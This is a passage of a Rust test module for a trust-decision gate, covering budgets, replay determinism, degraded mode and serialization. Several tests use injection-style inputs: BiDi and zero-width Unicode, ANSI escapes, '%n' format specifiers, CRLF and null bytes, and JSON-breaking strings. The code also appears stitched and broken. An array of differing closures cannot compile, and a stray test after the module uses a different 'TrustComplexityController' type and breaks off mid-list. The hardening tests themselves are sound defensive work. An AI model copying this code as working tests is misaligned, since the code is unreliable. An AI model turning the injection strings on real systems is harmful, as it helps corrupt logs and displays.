        assert!(!events.is_empty());
        assert!(gate.events().is_empty());
    }

    // ── Serde roundtrips ──────────────────────────────────────────────────

    #[test]
    fn trust_decision_context_serde_roundtrip() {
        let ctx = make_context("serde-test", 3);
        let json = serde_json::to_string(&ctx).unwrap();
        let parsed: TrustDecisionContext = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed, ctx);
    }

    #[test]
    fn trust_decision_serde_roundtrip() {
        let decision = make_decision("serde-d", TrustOutcome::Grant, 2);
        let json = serde_json::to_string(&decision).unwrap();
        let parsed: TrustDecision = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed, decision);
    }

    #[test]
    fn replay_result_serde_roundtrip() {
        let result = ReplayResult {
            decision_id: "r1".into(),
            original_outcome: TrustOutcome::Grant,
            replayed_outcome: TrustOutcome::Grant,
            deterministic: true,
        };
        let json = serde_json::to_string(&result).unwrap();
        let parsed: ReplayResult = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed, result);
    }

    #[test]
    fn degraded_state_serde_roundtrip() {
        let state = DegradedModeState::new(300);
        let json = serde_json::to_string(&state).unwrap();
        let parsed: DegradedModeState = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed, state);
    }

    #[test]
    fn audit_event_serde_roundtrip() {
        let event = TrustAuditEvent {
            code: "RTC-001".into(),
            decision_id: "d1".into(),
            endpoint_group: "default".into(),
            outcome: TrustOutcome::Grant,
            chain_depth: 2,
            detail: "verified".into(),
        };
        let json = serde_json::to_string(&event).unwrap();
        let parsed: TrustAuditEvent = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed, event);
    }

    // ── Determinism ───────────────────────────────────────────────────────

    #[test]
    fn determinism_same_input_same_report() {
        let build = || {
            let mut gate = TrustComplexityGate::default();
            gate.record_decision(make_decision("det", TrustOutcome::Grant, 2))
                .unwrap();
            let ctx = make_context("det", 2);
            gate.verify_replay(&ctx, |_| TrustOutcome::Grant);
            gate
        };

        let a = serde_json::to_string(&build().to_report()).unwrap();
        let b = serde_json::to_string(&build().to_report()).unwrap();
        assert_eq!(a, b, "report must be deterministic");
    }

    #[test]
    fn degraded_mode_expired_at_exact_boundary() {
        let mut state = DegradedModeState::new(60);
        state.activate("test", vec!["read".into()], "2026-01-01T00:00:00Z");
        // Set elapsed to exactly the max.
        state.elapsed_seconds = 60;
        assert!(
            state.is_expired(),
            "degraded mode must be expired at exact duration boundary"
        );
        // One second before the boundary: not expired.
        state.elapsed_seconds = 59;
        assert!(!state.is_expired());
    }

    #[test]
    fn zero_default_budget_rejects_any_nonzero_chain_depth() {
        let mut gate = TrustComplexityGate::new(ComplexityBudget::new(0), 300);

        let err = gate
            .record_decision(make_decision("zero-budget-over", TrustOutcome::Grant, 1))
            .expect_err("zero-depth budget must reject depth one");

        assert_eq!(err, TrustOutcome::Deny);
        assert!(gate.decisions().is_empty());
        assert_eq!(gate.events().len(), 1);
        assert_eq!(gate.events()[0].code, RTC_004_BUDGET_EXCEEDED);
        assert!(!gate.gate_pass());
    }

    #[test]
    fn zero_override_rejects_endpoint_even_when_default_budget_allows() {
        let mut budget = ComplexityBudget::new(5);
        budget.set_override("admin", 0);
        let mut gate = TrustComplexityGate::new(budget, 300);

        let err = gate
            .record_decision(make_decision_for_endpoint(
                "admin-zero-over",
                "admin",
                TrustOutcome::Grant,
                1,
            ))
            .expect_err("endpoint zero override must reject nonzero depth");

        assert_eq!(err, TrustOutcome::Deny);
        assert!(gate.decisions().is_empty());
        assert_eq!(gate.events()[0].endpoint_group, "admin");
        assert!(gate.events()[0].detail.contains("exceeds budget 0"));
    }

    #[test]
    fn replay_divergence_still_fails_gate_after_events_are_drained() {
        let mut gate = TrustComplexityGate::default();
        gate.record_decision(make_decision("drained-divergence", TrustOutcome::Grant, 1))
            .unwrap();
        let ctx = make_context("drained-divergence", 1);
        gate.verify_replay(&ctx, |_| TrustOutcome::Deny);
        assert!(!gate.gate_pass());

        let events = gate.take_events();

        assert!(
            events
                .iter()
                .any(|event| event.code == RTC_002_REPLAY_DIVERGED)
        );
        assert!(gate.events().is_empty());
        assert!(!gate.gate_pass());
        assert_eq!(gate.to_report()["invariants"][INV_RTC_REPLAY], false);
    }

    #[test]
    fn expired_degraded_state_still_fails_gate_after_events_are_drained() {
        let mut gate = TrustComplexityGate::new(ComplexityBudget::default(), 5);
        gate.record_decision(make_decision("expired-degraded", TrustOutcome::Degraded, 1))
            .unwrap();
        gate.enter_degraded_mode("dependency outage", vec!["read".into()], "ts");
        gate.update_degraded_elapsed(5);
        assert!(!gate.gate_pass());

        let events = gate.take_events();

        assert!(
            events
                .iter()
                .any(|event| event.code == RTC_003_DEGRADED_MODE)
        );
        assert!(gate.is_degraded_expired());
        assert!(!gate.gate_pass());
        assert_eq!(gate.to_report()["invariants"][INV_RTC_DEGRADED], false);
    }

    #[test]
    fn degraded_capability_cache_uses_exact_matches_only() {
        let mut gate = TrustComplexityGate::default();
        gate.enter_degraded_mode(
            "cache test",
            vec!["read".into(), "write:admin".into()],
            "ts",
        );

        assert!(gate.is_degraded_capability_cached("read"));
        assert!(!gate.is_degraded_capability_cached("rea"));
        assert!(!gate.is_degraded_capability_cached("read:admin"));
        assert!(!gate.is_degraded_capability_cached("write"));
    }

    #[test]
    fn maximum_chain_depth_budget_event_preserves_finite_summary() {
        let mut gate = TrustComplexityGate::new(ComplexityBudget::new(0), 300);

        let err = gate
            .record_decision(make_decision(
                "max-depth-denied",
                TrustOutcome::Grant,
                u32::MAX,
            ))
            .expect_err("max-depth decision must exceed zero budget");
        let summary = gate.summary();

        assert_eq!(err, TrustOutcome::Deny);
        assert_eq!(summary.total_decisions, 0);
        assert_eq!(summary.budget_exceeded, 1);
        assert_eq!(summary.avg_chain_depth, 0.0);
        assert!(!gate.gate_pass());
    }

    #[test]
    fn budget_failure_persists_after_event_drain_when_decision_history_exists() {
        let mut gate = TrustComplexityGate::new(ComplexityBudget::new(1), 300);
        gate.record_decision(make_decision(
            "clean-before-budget-fail",
            TrustOutcome::Grant,
            1,
        ))
        .unwrap();
        let err = gate
            .record_decision(make_decision(
                "too-deep-after-clean",
                TrustOutcome::Grant,
                2,
            ))
            .expect_err("budget failure must deny the over-depth decision");
        assert_eq!(err, TrustOutcome::Deny);
        assert!(!gate.gate_pass());

        let drained = gate.take_events();

        assert!(
            drained
                .iter()
                .any(|event| event.code == RTC_004_BUDGET_EXCEEDED)
        );
        assert!(gate.events().is_empty());
        assert_eq!(gate.decisions().len(), 1);
        assert!(!gate.gate_pass());
    }

    #[test]
    fn budget_summary_count_survives_event_drain() {
        let mut gate = TrustComplexityGate::new(ComplexityBudget::new(1), 300);
        gate.record_decision(make_decision("recorded-clean", TrustOutcome::Grant, 1))
            .unwrap();
        let _ = gate.record_decision(make_decision("recorded-too-deep", TrustOutcome::Deny, 2));
        let _ = gate.take_events();

        let summary = gate.summary();

        assert_eq!(summary.total_decisions, 1);
        assert_eq!(summary.budget_exceeded, 1);
        assert!(!gate.gate_pass());
    }

    #[test]
    fn budget_report_invariant_survives_event_drain() {
        let mut gate = TrustComplexityGate::new(ComplexityBudget::new(1), 300);
        gate.record_decision(make_decision("report-clean", TrustOutcome::Grant, 1))
            .unwrap();
        let _ = gate.record_decision(make_decision("report-too-deep", TrustOutcome::Grant, 2));
        let _ = gate.take_events();

        let report = gate.to_report();

        assert_eq!(report["gate_verdict"], "FAIL");
        assert_eq!(report["invariants"][INV_RTC_BUDGET], false);
        assert_eq!(report["summary"]["budget_exceeded"], 1);
    }

    #[test]
    fn inactive_degraded_state_does_not_authorize_manually_cached_capability() {
        let state = DegradedModeState {
            active: false,
            reason: "stale cache".to_string(),
            cached_capabilities: vec!["read".to_string()],
            activated_at: None,
            max_duration_seconds: 60,
            elapsed_seconds: 0,
        };

        assert!(!state.is_capability_cached("read"));
    }

    #[test]
    fn push_bounded_zero_capacity_clears_existing_items_without_panic() {
        let mut items = vec![1, 2, 3];

        push_bounded(&mut items, 4, 0);

        assert!(items.is_empty());
    }

    #[test]
    fn serde_rejects_unknown_trust_outcome_variant() {
        let decoded = serde_json::from_str::<TrustOutcome>(r#""allow""#);

        assert!(decoded.is_err());
    }

    #[test]
    fn serde_rejects_missing_decision_context_id() {
        let decoded = serde_json::from_str::<TrustDecisionContext>(
            r#"{"endpoint_group":"default","token":"tok","epoch":1,"capability_set":[],"clock_value":"ts","chain_depth":1}"#,
        );

        assert!(decoded.is_err());
    }

    #[test]
    fn serde_rejects_replay_result_without_deterministic_flag() {
        let decoded = serde_json::from_str::<ReplayResult>(
            r#"{"decision_id":"r1","original_outcome":"grant","replayed_outcome":"deny"}"#,
        );

        assert!(decoded.is_err());
    }

    #[test]
    fn trust_decision_unicode_injection_attack() {
        // Test BiDi override and control character injection in trust decision data
        let mut gate = TrustComplexityGate::default();

        let malicious_decision_id = format!("decision-{}\u{202e}evil\u{202d}-{}", "\u{200b}".repeat(500), "🚀".repeat(300));
        let malicious_endpoint = format!("endpoint-{}\u{2066}hidden\u{2069}-{}", "\u{feff}".repeat(100), "💥".repeat(200));
        let malicious_token = format!("token-{}\u{200f}rtl\u{200e}-{}", "🔥".repeat(100), "\u{202a}ltr\u{202c}".repeat(50));

        let malicious_capabilities = vec![
            format!("cap-{}\u{1f4a9}\u{200d}\u{1f525}", "\u{202e}RLO\u{202d}".repeat(50)),
            format!("cap-{}\x1b[31mred\x1b[0m", "\u{2066}LRI\u{2069}".repeat(30)),
            format!("cap-{}", "unicode-flood".repeat(1000)),
        ];

        let unicode_context = TrustDecisionContext {
            decision_id: malicious_decision_id.clone(),
            endpoint_group: malicious_endpoint.clone(),
            token: malicious_token,
            epoch: 1,
            capability_set: malicious_capabilities,
            clock_value: format!("2026-01-01T00:00:00Z-{}", "\u{200b}".repeat(100)),
            chain_depth: 2,
        };

        let unicode_decision = TrustDecision {
            context: unicode_context,
            outcome: TrustOutcome::Grant,
            reason: format!("reason-{}\u{202e}hidden\u{202d}", "🔥".repeat(200)),
            decided_at: format!("2026-01-01T01:00:00Z-{}", "\u{feff}".repeat(50)),
        };

        assert!(gate.record_decision(unicode_decision).is_ok());

        // Verify stored decision handles massive Unicode safely
        assert_eq!(gate.decisions().len(), 1);
        assert_eq!(gate.decisions()[0].context.decision_id, malicious_decision_id);
        assert!(gate.decisions()[0].context.decision_id.chars().count() > 800);

        // Test display safety (no panic on format)
        let debug_str = format!("{:?}", gate.decisions()[0]);
        assert!(debug_str.len() > 100);

        // Test replay with Unicode injection
        let replay_context = make_context(&malicious_decision_id, 2);
        let replay_result = gate.verify_replay(&replay_context, |_| TrustOutcome::Grant);
        assert!(replay_result.deterministic);

        // Test serialization robustness with Unicode injection
        let json_result = serde_json::to_string(&gate.decisions()[0]);
        assert!(json_result.is_ok());
        let parsed: Result<TrustDecision, _> = serde_json::from_str(&json_result.unwrap());
        assert!(parsed.is_ok());

        // Verify events handle Unicode safely
        assert!(!gate.events().is_empty());
        assert!(gate.events()[0].detail.len() > 10);
    }

    #[test]
    fn trust_complexity_memory_exhaustion_stress() {
        // Test bounded storage with massive trust decision payloads
        let mut gate = TrustComplexityGate::default();

        let massive_decision_id = "a".repeat(100000);
        let massive_endpoint = format!("endpoint-{}", "x".repeat(50000));
        let massive_token = format!("token-{}", "y".repeat(75000));

        // Create massive capability set payload
        let mut massive_capabilities = Vec::new();
        for i in 0..10000 {
            massive_capabilities.push(format!("capability_{}_with_very_long_name_{}", i, "z".repeat(1000)));
        }

        // Stress test with many oversized trust decisions
        for i in 0..1000 {
            let decision_context = TrustDecisionContext {
                decision_id: format!("{massive_decision_id}-{i}"),
                endpoint_group: format!("{massive_endpoint}-{i}"),
                token: format!("{massive_token}-{i}"),
                epoch: i as u64,
                capability_set: massive_capabilities.clone(),
                clock_value: format!("2026-01-{:02}T00:00:00Z-{}", (i % 28) + 1, "ts".repeat(10000)),
                chain_depth: (i % 5) as u32,
            };

            let massive_decision = TrustDecision {
                context: decision_context,
                outcome: match i % 4 {
                    0 => TrustOutcome::Grant,
                    1 => TrustOutcome::Deny,
                    2 => TrustOutcome::Escalate,
                    _ => TrustOutcome::Degraded,
                },
                reason: format!("reason-{}-{}", i, "massive-payload".repeat(5000)),
                decided_at: format!("2026-01-{:02}T01:00:00Z-{}", (i % 28) + 1, "decided".repeat(10000)),
            };

            let record_result = gate.record_decision(massive_decision);
            let _ = record_result; // Allow any result due to capacity limits
        }

        // Verify bounded capacity prevents memory exhaustion
        assert!(gate.decisions().len() <= MAX_DECISIONS);

        // Verify memory usage is bounded despite massive payloads
        let total_decision_size: usize = gate.decisions().iter()
            .map(|d| d.context.decision_id.len() + d.context.endpoint_group.len() +
                     d.context.capability_set.iter().map(|c| c.len()).sum::<usize>())
            .sum();
        assert!(total_decision_size < 100_000_000); // Reasonable memory bound

        // Test replay with massive payload
        if !gate.decisions().is_empty() {
            let first_decision_id = &gate.decisions()[0].context.decision_id;
            let replay_context = TrustDecisionContext {
                decision_id: first_decision_id.clone(),
                ..make_context("temp", 1)
            };
            let replay_result = gate.verify_replay(&replay_context, |_| TrustOutcome::Grant);
            let _ = replay_result; // Should handle massive payloads safely
        }

        // Verify bounded event storage
        assert!(gate.events().len() <= MAX_EVENTS);
    }

    #[test]
    fn trust_decision_json_structure_integrity_validation() {
        // Test malicious JSON injection in trust decision structures
        let mut gate = TrustComplexityGate::default();

        let json_bomb = r#"{"nested":{"arrays":[[[[["very","deep"]]]]],"objects":{"a":{"b":{"c":{"d":"value"}}}}}}"#;
        let json_injection_id = format!(r#"decision","malicious":{json_bomb},"legitimate":"#);

        let injection_context = TrustDecisionContext {
            decision_id: json_injection_id.clone(),
            endpoint_group: format!(r#"endpoint","injection":{json_bomb},"hidden":"#),
            token: format!(r#"token","evil":{json_bomb},"normal":"#),
            epoch: 42,
            capability_set: vec![
                format!(r#"cap","malicious":{json_bomb},"legit":"#),
                "normal_capability".to_string(),
                json_bomb.to_string(),
            ],
            clock_value: format!(r#"2026-01-01T00:00:00Z","attack":{json_bomb},"time":"#),
            chain_depth: 1,
        };

        let injection_decision = TrustDecision {
            context: injection_context,
            outcome: TrustOutcome::Grant,
            reason: format!(r#"reason","payload":{json_bomb},"normal":"#),
            decided_at: format!(r#"2026-01-01T01:00:00Z","bomb":{json_bomb},"ts":"#),
        };

        assert!(gate.record_decision(injection_decision).is_ok());

        // Verify JSON serialization integrity
        let serialized = serde_json::to_string(&gate.decisions()[0]).unwrap();
        assert!(!serialized.contains(r#""malicious":{"nested""#)); // Injection should be escaped

        // Test deserialization with injected structure
        let parsed: TrustDecision = serde_json::from_str(&serialized).unwrap();
        assert_eq!(parsed.context.decision_id, json_injection_id);

        // Test replay with JSON injection data
        let replay_context = TrustDecisionContext {
            decision_id: json_injection_id,
            ..make_context("temp", 1)
        };
        let replay_result = gate.verify_replay(&replay_context, |_| TrustOutcome::Grant);
        assert!(replay_result.deterministic);

        // Verify audit summary with injected data
        let summary = gate.summary();
        assert_eq!(summary.total_decisions, 1);
        assert!(summary.avg_chain_depth.is_finite());
        assert!(summary.replay_success_rate_pct.is_finite());

        // Test report generation with malicious data
        let report = gate.to_report();
        assert_eq!(report["bead_id"], "bd-kiqr");
        assert_eq!(report["gate_verdict"], "PASS");
    }

    #[test]
    fn trust_complexity_arithmetic_overflow_protection() {
        // Test saturating arithmetic in various numeric contexts
        let mut gate = TrustComplexityGate::default();

        // Test extreme epoch values
        let extreme_epochs = [0, 1, u64::MAX - 1000, u64::MAX - 1, u64::MAX];
        for (i, &epoch) in extreme_epochs.iter().enumerate() {
            let extreme_context = TrustDecisionContext {
                decision_id: format!("extreme-epoch-{}", i),
                endpoint_group: "extreme-endpoint".to_string(),
                token: format!("extreme-token-{}", i),
                epoch,
                capability_set: vec!["extreme-cap".to_string()],
                clock_value: "2026-01-01T00:00:00Z".to_string(),
                chain_depth: i as u32,
            };

            let extreme_decision = TrustDecision {
                context: extreme_context,
                outcome: TrustOutcome::Grant,
                reason: format!("Extreme epoch test {}", epoch),
                decided_at: "2026-01-01T01:00:00Z".to_string(),
            };

            let record_result = gate.record_decision(extreme_decision);
            assert!(record_result.is_ok()); // Should handle extreme epochs safely
        }

        // Test extreme chain depth values
        let extreme_depths = [0, 1, u32::MAX - 1000, u32::MAX - 1, u32::MAX];
        let mut extreme_budget = ComplexityBudget::new(u32::MAX); // Allow extreme depths
        let mut extreme_gate = TrustComplexityGate::new(extreme_budget, 300);

        for (i, &depth) in extreme_depths.iter().enumerate() {
            let depth_context = TrustDecisionContext {
                decision_id: format!("extreme-depth-{}", i),
                endpoint_group: "depth-endpoint".to_string(),
                token: format!("depth-token-{}", i),
                epoch: i as u64,
                capability_set: vec!["depth-cap".to_string()],
                clock_value: "2026-01-01T02:00:00Z".to_string(),
                chain_depth: depth,
            };

            let depth_decision = TrustDecision {
                context: depth_context,
                outcome: TrustOutcome::Grant,
                reason: format!("Extreme depth test {}", depth),
                decided_at: "2026-01-01T03:00:00Z".to_string(),
            };

            let record_result = extreme_gate.record_decision(depth_decision);
            assert!(record_result.is_ok()); // Should handle extreme depths safely
        }

        // Test summary calculations with extreme values
        let summary = extreme_gate.summary();
        assert!(summary.total_decisions <= extreme_depths.len() as u64);
        assert!(summary.avg_chain_depth.is_finite()); // Should not overflow to NaN/Inf
        assert!(summary.replay_success_rate_pct >= 0.0 && summary.replay_success_rate_pct <= 100.0);

        // Test degraded mode with extreme durations
        let mut degraded_gate = TrustComplexityGate::new(ComplexityBudget::default(), u64::MAX);
        degraded_gate.enter_degraded_mode("extreme-duration", vec!["cap".to_string()], "2026-01-01T00:00:00Z");
        degraded_gate.update_degraded_elapsed(u64::MAX - 1);
        assert!(degraded_gate.is_degraded_expired()); // Should handle extreme elapsed time

        degraded_gate.update_degraded_elapsed(0);
        assert!(!degraded_gate.is_degraded_expired()); // Should reset safely
    }

    #[test]
    fn trust_decision_replay_collision_resistance() {
        // Test replay verification against collision and manipulation attacks
        let mut gate = TrustComplexityGate::default();

        // Record baseline decisions
        let baseline_decisions = [
            ("decision-1", TrustOutcome::Grant, 1),
            ("decision-2", TrustOutcome::Deny, 2),
            ("decision-3", TrustOutcome::Escalate, 3),
        ];

        for (id, outcome, depth) in baseline_decisions {
            let decision = make_decision(id, outcome, depth);
            gate.record_decision(decision).unwrap();
        }

        // Test various replay collision attempts
        let collision_attempts = [
            // Different decision ID, same context
            ("collision-1", "decision-1", TrustOutcome::Grant),
            // Same decision ID, different outcome
            ("decision-1", "decision-1", TrustOutcome::Deny),
            // Unicode variants
            ("decision\u{200b}-1", "decision-1", TrustOutcome::Grant),
            ("decision-1\u{feff}", "decision-1", TrustOutcome::Grant),
            ("decision\u{202e}-1\u{202d}", "decision-1", TrustOutcome::Grant),
            // NULL byte injection
            ("decision-1\0collision", "decision-1", TrustOutcome::Grant),
        ];

        for (replay_id, lookup_id, expected_outcome) in collision_attempts {
            let collision_context = TrustDecisionContext {
                decision_id: replay_id.to_string(),
                ..make_context(lookup_id, 1)
            };

            let replay_result = gate.verify_replay(&collision_context, |_| expected_outcome);

            if replay_id == lookup_id {
                // Exact match should be deterministic if outcomes match
                if expected_outcome == TrustOutcome::Grant {
                    assert!(replay_result.deterministic);
                } else {
                    assert!(!replay_result.deterministic); // Different outcome
                }
            } else {
                // Non-exact matches should not find original decision
                assert_eq!(replay_result.original_outcome, expected_outcome);
                assert_eq!(replay_result.replayed_outcome, expected_outcome);
                assert!(replay_result.deterministic); // No original to compare
            }
        }

        // Test replay result storage resistance
        let replay_results = gate.replay_results();
        assert!(replay_results.len() <= MAX_REPLAY_RESULTS);

        for result in replay_results {
            assert!(!result.decision_id.is_empty());
            // Verify no corruption from collision attempts
        }
    }

    #[test]
    fn trust_complexity_concurrent_gate_safety() {
        // Test concurrent trust complexity gate operations for race conditions
        use std::sync::{Arc, Mutex};
        use std::thread;

        let gate = Arc::new(Mutex::new(TrustComplexityGate::default()));
        let mut handles = vec![];

        // Spawn concurrent threads performing different operations
        for thread_id in 0..10 {
            let gate_clone = Arc::clone(&gate);

            let handle = thread::spawn(move || {
                let operations = [
                    // Record decision operations
                    || {
                        let mut g = gate_clone.lock().unwrap();
                        let decision = TrustDecision {
                            context: TrustDecisionContext {
                                decision_id: format!("concurrent-{thread_id}"),
                                endpoint_group: format!("endpoint-{thread_id}"),
                                token: format!("token-{thread_id}"),
                                epoch: thread_id as u64,
                                capability_set: vec![format!("cap-{thread_id}")],
                                clock_value: format!("2026-01-{:02}T00:00:00Z", (thread_id % 28) + 1),
                                chain_depth: thread_id as u32 % 3,
                            },
                            outcome: match thread_id % 4 {
                                0 => TrustOutcome::Grant,
                                1 => TrustOutcome::Deny,
                                2 => TrustOutcome::Escalate,
                                _ => TrustOutcome::Degraded,
                            },
                            reason: format!("Concurrent test {thread_id}"),
                            decided_at: format!("2026-01-{:02}T01:00:00Z", (thread_id % 28) + 1),
                        };
                        let _ = g.record_decision(decision);
                    },
                    // Replay verification operations
                    || {
                        let mut g = gate_clone.lock().unwrap();
                        let context = TrustDecisionContext {
                            decision_id: format!("concurrent-{thread_id}"),
                            endpoint_group: format!("endpoint-{thread_id}"),
                            token: format!("token-{thread_id}"),
                            epoch: thread_id as u64,
                            capability_set: vec![format!("cap-{thread_id}")],
                            clock_value: format!("2026-01-{:02}T00:00:00Z", (thread_id % 28) + 1),
                            chain_depth: thread_id as u32 % 3,
                        };
                        let _ = g.verify_replay(&context, |_| TrustOutcome::Grant);
                    },
                    // Degraded mode operations
                    || {
                        let mut g = gate_clone.lock().unwrap();
                        if thread_id % 3 == 0 {
                            g.enter_degraded_mode("concurrent test", vec![format!("cap-{thread_id}")], "ts");
                        } else if thread_id % 3 == 1 {
                            g.update_degraded_elapsed(thread_id as u64);
                        } else {
                            g.exit_degraded_mode();
                        }
                    }
                ];

                // Perform multiple operations in this thread
                for op in operations.iter().cycle().take(50) {
                    op();
                }
            });

            handles.push(handle);
        }

        // Wait for all threads to complete
        for handle in handles {
            handle.join().expect("Thread panicked");
        }

        // Verify final state consistency
        let final_gate = gate.lock().unwrap();
        assert!(final_gate.decisions().len() <= 10); // At most 10 decisions added
        assert!(final_gate.replay_results().len() <= 10); // At most 10 replays
        assert!(final_gate.events().len() <= MAX_EVENTS);

        // Verify no data corruption from concurrent access
        for decision in final_gate.decisions() {
            assert!(decision.context.decision_id.starts_with("concurrent-"));
            assert!(decision.context.endpoint_group.starts_with("endpoint-"));
            assert!(decision.reason.starts_with("Concurrent test"));
        }

        // Test report generation after concurrent operations
        let report = final_gate.to_report();
        assert_eq!(report["bead_id"], "bd-kiqr");
        assert!(report.get("summary").is_some());
        assert!(report.get("invariants").is_some());
    }

    #[test]
    fn trust_decision_display_injection_and_format_safety() {
        // Test format string injection and display safety
        let mut gate = TrustComplexityGate::default();

        // Create data with format specifiers and injection attempts
        let malicious_inputs = [
            ("decision-{}", "endpoint-{}", "reason-{}", "decided-%s"),
            ("decision\n\tmalicious", "endpoint\x00null", "reason\r\nCRLF", "decided\x1b[H"),
            ("decision%n%s%d", "endpoint%x%p", "reason%c%u", "decided%ld%zu"),
            ("decision\x1b[31mred\x1b[0m", "endpoint\x1b[1mbold\x1b[0m", "reason\x1b[?1049h", "decided\x1b[2J"),
            ("decision\u{1f4a9}\u{200d}\u{1f525}", "endpoint\u{202e}RLO\u{202d}", "reason\u{2066}LRI\u{2069}", "decided\u{200f}RTL\u{200e}"),
        ];

        for (i, (decision_id, endpoint, reason, decided_at)) in malicious_inputs.into_iter().enumerate() {
            let malicious_context = TrustDecisionContext {
                decision_id: decision_id.to_string(),
                endpoint_group: endpoint.to_string(),
                token: format!("token-{}", decision_id),
                epoch: i as u64,
                capability_set: vec![
                    format!("cap-{}", endpoint),
                    "normal-capability".to_string(),
                    reason.to_string(),
                ],
                clock_value: format!("2026-01-{:02}T00:00:00Z", (i % 28) + 1),
                chain_depth: i as u32,
            };

            let malicious_decision = TrustDecision {
                context: malicious_context,
                outcome: TrustOutcome::Grant,
                reason: reason.to_string(),
                decided_at: decided_at.to_string(),
            };

            assert!(gate.record_decision(malicious_decision).is_ok());
        }

        // Test display safety - should not panic or produce control sequences
        for decision in gate.decisions() {
            let debug_str = format!("{:?}", decision);
            assert!(!debug_str.contains('\x00'), "Debug output should escape null bytes");
            assert!(!debug_str.contains('\r'), "Debug should escape CRLF");
            assert!(!debug_str.contains('\n'), "Debug should escape newlines");

            // Test individual field display safety
            let outcome_str = format!("{}", decision.outcome);
            assert!(outcome_str.len() > 0);
        }

        // Test audit event display safety
        for event in gate.events() {
            let event_debug = format!("{:?}", event);
            assert!(!event_debug.contains('\x1b'), "Event debug should escape ANSI");

            let detail_display = format!("{}", event.detail);
            assert!(detail_display.len() > 0);
        }

        // Test summary display safety
        let summary = gate.summary();
        let summary_debug = format!("{:?}", summary);
        assert!(!summary_debug.contains('\x00'), "Summary debug should be safe");
        assert!(summary.avg_chain_depth.is_finite());
        assert!(summary.replay_success_rate_pct.is_finite());

        // Test report generation display safety
        let report = gate.to_report();
        let report_str = report.to_string();
        assert!(!report_str.contains('\x00'), "Report should escape control chars");
        assert!(report_str.len() > 50);

        // Test replay with malicious display data
        let replay_context = make_context("decision-{}", 0);
        let replay_result = gate.verify_replay(&replay_context, |_| TrustOutcome::Grant);
        let replay_debug = format!("{:?}", replay_result);
        assert!(replay_debug.len() > 10);
    }

    #[test]
    fn trust_complexity_boundary_condition_stress_testing() {
        // Test extreme boundary conditions and edge cases
        let mut gate = TrustComplexityGate::default();

        // Test empty and minimal inputs
        let boundary_decisions = [
            // Empty strings
            TrustDecisionContext {
                decision_id: String::new(),
                endpoint_group: String::new(),
                token: String::new(),
                epoch: 0,
                capability_set: vec![],
                clock_value: String::new(),
                chain_depth: 0,
            },
            // Single character
            TrustDecisionContext {
                decision_id: "a".to_string(),
                endpoint_group: "b".to_string(),
                token: "c".to_string(),
                epoch: 1,
                capability_set: vec!["d".to_string()],
                clock_value: "e".to_string(),
                chain_depth: 1,
            },
            // Extreme values
            TrustDecisionContext {
                decision_id: "extreme".to_string(),
                endpoint_group: "endpoint-extreme".to_string(),
                token: "token-extreme".to_string(),
                epoch: u64::MAX,
                capability_set: (0..1000).map(|i| format!("cap-{i}")).collect(),
                clock_value: "2026-12-31T23:59:59Z".to_string(),
                chain_depth: u32::MAX,
            },
        ];

        for (i, context) in boundary_decisions.into_iter().enumerate() {
            let boundary_decision = TrustDecision {
                context,
                outcome: match i % 4 {
                    0 => TrustOutcome::Grant,
                    1 => TrustOutcome::Deny,
                    2 => TrustOutcome::Escalate,
                    _ => TrustOutcome::Degraded,
                },
                reason: if i == 0 { String::new() } else { format!("boundary-{i}") },
                decided_at: if i == 0 { String::new() } else { "2026-01-01T00:00:00Z".to_string() },
            };

            let record_result = gate.record_decision(boundary_decision);
            let _ = record_result; // Allow any result for boundary conditions
        }

        // Test boundary complexity budgets
        let boundary_budgets = [
            ComplexityBudget::new(0),           // Zero budget
            ComplexityBudget::new(1),           // Minimal budget
            ComplexityBudget::new(u32::MAX),    // Maximum budget
        ];

        for (i, budget) in boundary_budgets.into_iter().enumerate() {
            let mut boundary_gate = TrustComplexityGate::new(budget, 300);
            let test_decision = make_decision(&format!("budget-{i}"), TrustOutcome::Grant, 5);
            let record_result = boundary_gate.record_decision(test_decision);

            if i == 0 {
                assert!(record_result.is_err()); // Zero budget should reject depth 5
            } else {
                let _ = record_result; // Other budgets may succeed
            }
        }

        // Test boundary degraded mode durations
        let boundary_durations = [0, 1, u64::MAX];
        for (i, duration) in boundary_durations.iter().enumerate() {
            let mut duration_gate = TrustComplexityGate::new(ComplexityBudget::default(), *duration);
            duration_gate.enter_degraded_mode("boundary", vec![], "ts");
            duration_gate.update_degraded_elapsed(*duration);

            if *duration == 0 {
                assert!(duration_gate.is_degraded_expired());
            } else if *duration == 1 {
                assert!(duration_gate.is_degraded_expired()); // At exact boundary
            } else {
                assert!(duration_gate.is_degraded_expired()); // MAX duration with MAX elapsed
            }
        }

        // Test extremely long strings
        let long_strings = [
            "a".repeat(1000000),
            "x".repeat(10000000),
            "\u{1f4a9}".repeat(100000),
        ];

        for (i, long_str) in long_strings.iter().enumerate() {
            let long_context = TrustDecisionContext {
                decision_id: format!("long-{i}"),
                endpoint_group: long_str.clone(),
                token: long_str.clone(),
                epoch: i as u64,
                capability_set: vec![long_str.clone()],
                clock_value: format!("2026-01-01T00:00:00Z-{}", &long_str[..std::cmp::min(50, long_str.len())]),
                chain_depth: 1,
            };

            let long_decision = TrustDecision {
                context: long_context,
                outcome: TrustOutcome::Grant,
                reason: long_str.clone(),
                decided_at: "2026-01-01T01:00:00Z".to_string(),
            };

            let record_result = gate.record_decision(long_decision);
            // Should handle very long strings without crashing
            let _ = record_result;
        }

        // Test serialization with boundary data
        let json_result = serde_json::to_string(&gate);
        // May fail due to extreme data, but should not crash
        let _ = json_result;

        // Test final state consistency
        assert!(gate.decisions().len() <= MAX_DECISIONS);
        assert!(gate.events().len() <= MAX_EVENTS);
        assert!(gate.replay_results().len() <= MAX_REPLAY_RESULTS);

        let summary = gate.summary();
        assert!(summary.total_decisions < u64::MAX);
        assert!(summary.avg_chain_depth.is_finite());
        assert!(summary.replay_success_rate_pct >= 0.0 && summary.replay_success_rate_pct <= 100.0);
    }
}

    #[test]
    fn negative_unicode_injection_in_trust_decision_identifiers() {
        // Test trust decision identifiers with Unicode and malicious content
        let mut controller = TrustComplexityController::new(100, 1000);

        let malicious_decision_cases = vec![
            // Unicode scripts
            ("决定🚀rocket", "endpoint-🔥fire", "token-⚡lightning"),
            ("решение-кириллица", "эндпоинт-тест", "токен-безопасность"),
            ("決定-日本語", "エンドポイント-テスト", "トークン-セキュリティ"),

            // Control characters and injection
            ("decision\0null", "endpoint\r\ninjection", "token\x01control"),
